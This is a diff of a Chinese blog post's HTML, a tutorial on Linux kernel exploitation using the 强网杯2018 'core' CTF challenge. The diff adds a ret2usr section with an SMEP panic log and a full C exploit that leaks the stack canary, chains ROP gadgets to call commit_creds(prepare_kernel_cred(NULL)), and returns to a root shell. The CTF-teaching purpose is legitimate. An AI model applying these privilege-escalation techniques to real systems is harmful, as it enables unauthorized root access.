@@ -204,7 +204,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.9k 字
+      4k 字
     </span>
   
 
@@ -214,7 +214,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      40
+      58
        分钟
     </span>
   
@@ -256,7 +256,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年3月9日 凌晨
+                  本文最后更新于：2021年3月10日 凌晨
                 
               </p>
             
@@ -264,9 +264,10 @@
               <p>宁也是带黑阔？</p>
 <a id="more"></a>
 
-<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>毫无疑问，对于内核漏洞进行利用，并最终提权到root，在黑客界是一种最为old school的美学（x</p>
+<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>毫无疑问，对于内核漏洞进行利用，并最终提权到root，在黑客界是一种最为old school的美学（</p>
 <p>而对于Linux Kernel Pwn入门的最简单的方式，毫无疑问就是从CTF中的kernel pwn题目开始，一步一步地从最基础的几种简单的利用方式开始学习，最后迈向真实世界中的各大CVE</p>
-<p>因此本篇来讲讲CTF中几种较为常见的kernel利用方式</p>
+<p>✳ <strong>kernel pwn与用户态的pwn在本质上并无差别</strong></p>
+<p>本篇来讲讲CTF中几种较为常见的kernel利用方式</p>
 <blockquote>
 <p>需要注意的是，CTF中的kernel pwn通常不会让选手去真正寻找内核中的漏洞，而通常是给出一个有漏洞的LKM让选手进行分析</p>
 </blockquote>
@@ -402,13 +403,13 @@ poweroff -d 0  -f</code></pre>
 </ul>
 <p>那么我们只需要在内核中找到相应的gadget并执行<code>swapgs;iretq</code>就可以成功着陆回用户态</p>
 <p>通常来说，我们应当构造如下rop链以返回用户态并获得一个shell：</p>
-<pre><code class="hljs awk">swapgs
-iretq
-user_shell_addr
-user_cs
-user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags
-user_sp
-user_ss</code></pre>
+<pre><code class="hljs awk">↓	swapgs
+	iretq
+	user_shell_addr
+	user_cs
+	user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags
+	user_sp
+	user_ss</code></pre>
 
 <p>内核ROP和用户态的ROP本质上没有太大区别，细节便不在此赘叙了</p>
 <h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><blockquote>
@@ -506,8 +507,6 @@ poweroff -d 0  -f</code></pre>
 
 <span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;
 
-<span class="hljs-keyword">int</span> exec = <span class="hljs-number">0</span>;
-
 <span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;
 <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span>
 <span class="hljs-function"></span>&#123;
@@ -522,7 +521,6 @@ poweroff -d 0  -f</code></pre>
 
 <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>
 <span class="hljs-function"></span>&#123;
-    exec++;
     <span class="hljs-keyword">if</span>(getuid())
     &#123;
         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);
@@ -619,18 +617,194 @@ poweroff -d 0  -f</code></pre>
 
     write(fd, rop_chain, <span class="hljs-number">0x800</span>);
     coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));
-
-    <span class="hljs-keyword">if</span>(!exec)
-        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;FXCK YOU!&quot;</span>);
 &#125;
 </code></pre>
 
 <p>编译指令：</p>
 <pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc ./exploit.c -o exploit -static -masm=intel</span></code></pre>
 
+<p>本地调试的话重新打包即可</p>
+<pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find . | cpio -o -H newc &gt; ../core.cpio</span></code></pre>
+
 <p>运行即可获得root shell</p>
 <p><img src="https://i.loli.net/2021/03/09/4InLOlstS3UZiPh.png" srcset="/img/loading.gif" alt="image.png"></p>
-<h1 id="0x03-Kernel-ROP-ret2usr"><a href="#0x03-Kernel-ROP-ret2usr" class="headerlink" title="0x03.Kernel ROP - ret2usr"></a>0x03.Kernel ROP - ret2usr</h1><h1 id="0x04-Kernel-ROP-ret2dir"><a href="#0x04-Kernel-ROP-ret2dir" class="headerlink" title="0x04.Kernel ROP - ret2dir"></a>0x04.Kernel ROP - ret2dir</h1><h1 id="0x05-条件竞争"><a href="#0x05-条件竞争" class="headerlink" title="0x05.条件竞争"></a>0x05.条件竞争</h1><h1 id="0x06-内核堆喷-heap-spraying"><a href="#0x06-内核堆喷-heap-spraying" class="headerlink" title="0x06.内核堆喷(heap spraying)"></a>0x06.内核堆喷(heap spraying)</h1>
+<h1 id="0x03-Kernel-ROP-ret2usr"><a href="#0x03-Kernel-ROP-ret2usr" class="headerlink" title="0x03.Kernel ROP - ret2usr"></a>0x03.Kernel ROP - ret2usr</h1><p><strong>在【未】开启SMAP/SMEP保护的情况下</strong>，用户空间无法访问内核空间的数据，但是内核空间可以访问用户空间的数据，因此ret2usr这种攻击手法应运而生——通过kernel ROP以内核的ring 0权限执行用户空间的代码以完成提权</p>
+<p>通常CTF中的ret2usr还是以执行<code>commit_creds(prepare_kernel_cred(NULL))</code>进行提权为主要的攻击手法，不过相比起构造冗长的ROP chain，ret2usr只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接执行即可</p>
+<p>✳ 需要注意的是，对于开启了<code>SMAP/SMEP保护</code>的kernel而言，<strong>内核空间尝试直接访问用户空间会引起kernel panic</strong></p>
+<p>在这种情况下我们无法直接进行ret2usr，因此需要更加高级的攻击手法如ret2dir等绕过SMAP/SMEP保护，亦或是关闭SMAP/SMEP后再进行ret2usr</p>
+<blockquote>
+<p>通常情况下的报错信息大概如下所示：</p>
+<pre><code class="hljs shell">[    7.168602] core: called core_writen
+[    7.168919] unable to execute userspace code (SMEP?) (uid: 1000)
+[    7.170547] BUG: unable to handle kernel paging request at 0000000000401d8a
+[    7.171399] IP: 0x401d8a
+[    7.171598] PGD 800000000fb5e067 P4D 800000000fb5e067 PUD fb5f067 PMD fb59065
+[    7.172087] Oops: 0011 [#1] SMP PTI
+[    7.172429] Modules linked in: core(O)
+[    7.172937] CPU: 0 PID: 995 Comm: exploit Tainted: G           O     4.15.8 9
+[    7.173337] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.134
+[    7.173736] RIP: 0010:0x401d8a
+[    7.173865] RSP: 0018:ffff9e5b40113e70 EFLAGS: 00000296
+[    7.174418] RAX: 0000000000000000 RBX: 2cbe9f17d07a4800 RCX: 0000000000000000
+[    7.174780] RDX: 0000000000000000 RSI: ffffffffc0165500 RDI: ffff9e5b40113f18
+[    7.175257] RBP: ffffffffffff0100 R08: 6163203a65726f63 R09: 0000000000000de8
+[    7.176123] R10: 0000000000000004 R11: 6e65746972775f65 R12: ffff9ba74a80f7a0
+[    7.176801] R13: 000000006677889a R14: ffffffffffff0100 R15: 0000000000000000
+[    7.177424] FS:  000000000110b880(0000) GS:ffff9ba74bc00000(0000) knlGS:00000
+[    7.178205] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    7.178836] CR2: 0000000000401d8a CR3: 000000000fb62000 CR4: 00000000003006f0
+[    7.179483] Call Trace:
+[    7.180390]  ? native_load_gs_index+0xa/0x10
+[    7.180894]  ? push_to_pool+0x8/0x30
+[    7.181194]  ? do_syscall_64+0x56/0xf0
+[    7.181431]  ? entry_SYSCALL_64_after_hwframe+0x3d/0xa2
+[    7.182556] Code:  Bad RIP value.
+[    7.183461] RIP: 0x401d8a RSP: ffff9e5b40113e70
+[    7.184270] CR2: 0000000000401d8a
+[    7.185409] ---[ end trace 11e9381f0a3911ca ]---
+[    7.186319] Kernel panic - not syncing: Fatal exception
+[    7.187391] Kernel Offset: 0x32800000 from 0xffffffff81000000 (relocation ra)
+[    7.188504] Rebooting in 1 seconds..</code></pre>
+</blockquote>
+<h2 id="例题：强网杯2018-core-1"><a href="#例题：强网杯2018-core-1" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><blockquote>
+<p>好像也找不到别的ret2usr的题了…</p>
+</blockquote>
+<p>具体的这里就不再重复分析了，由于其未开启smap/smep保护，故可以考虑在进程中构造好对应的函数指针后直接ret2usr以提权，我们只需要将代码稍加修改即可</p>
+<p>最终的exp如下：</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  IRETQ 0xffffffff813eb448</span>
+
+<span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;
+
+<span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span>
+            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span>
+            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span>
+            <span class="hljs-string">&quot;pushf;&quot;</span>
+            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>
+            );
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *) = prepare_kernel_cred;
+    <span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *) = commit_creds;
+    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>
+<span class="hljs-function"></span>&#123;   
+    <span class="hljs-keyword">if</span>(getuid())
+    &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    &#125;
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);
+    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> * buf)</span></span>
+<span class="hljs-function"></span>&#123;
+    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> off)</span></span>
+<span class="hljs-function"></span>&#123;
+    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> nbytes)</span></span>
+<span class="hljs-function"></span>&#123;
+    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);
+    saveStatus();
+
+    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);
+    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)
+    &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    &#125;
+
+    <span class="hljs-comment">//get the addr</span>
+    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)
+    &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    &#125;
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];
+    <span class="hljs-keyword">size_t</span> addr;
+    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))
+    &#123;
+        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)
+            <span class="hljs-keyword">break</span>;
+
+        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))
+        &#123;
+            commit_creds = addr;
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);
+            <span class="hljs-keyword">continue</span>;
+        &#125;
+
+        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))
+        &#123;
+            prepare_kernel_cred = addr;
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);
+            <span class="hljs-keyword">continue</span>;
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;
+
+    <span class="hljs-comment">// get the canary</span>
+    <span class="hljs-keyword">size_t</span> canary;
+    setOffValue(fd, <span class="hljs-number">64</span>);
+    coreRead(fd, buf);
+    canary = ((<span class="hljs-keyword">size_t</span> *)buf)[<span class="hljs-number">0</span>];
+
+    <span class="hljs-comment">//construct the ropchain</span>
+    <span class="hljs-keyword">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)
+        rop_chain[i] = canary;
+    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootPrivilige;
+    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
+    rop_chain[i++] = <span class="hljs-number">0</span>;
+    rop_chain[i++] = IRETQ + offset;
+    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootShell;
+    rop_chain[i++] = user_cs;
+    rop_chain[i++] = user_rflags;
+    rop_chain[i++] = user_sp;
+    rop_chain[i++] = user_ss;
+
+    write(fd, rop_chain, <span class="hljs-number">0x800</span>);
+    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));
+&#125;
+</code></pre>
+
+<p>重新打包，运行，成功获取root权限</p>
+<p><img src="https://i.loli.net/2021/03/10/ZJr5aWSmlBM8AXt.png" srcset="/img/loading.gif" alt="image.png"></p>
+<h1 id="0x04-Kernel-ROP-ret2dir"><a href="#0x04-Kernel-ROP-ret2dir" class="headerlink" title="0x04.Kernel ROP - ret2dir"></a>0x04.Kernel ROP - ret2dir</h1><h1 id="0x05-条件竞争"><a href="#0x05-条件竞争" class="headerlink" title="0x05.条件竞争"></a>0x05.条件竞争</h1><h1 id="0x06-内核堆喷-heap-spraying"><a href="#0x06-内核堆喷-heap-spraying" class="headerlink" title="0x06.内核堆喷(heap spraying)"></a>0x06.内核堆喷(heap spraying)</h1><pre><code class="hljs plain"></code></pre>
             </div>
             <hr>
             <div>
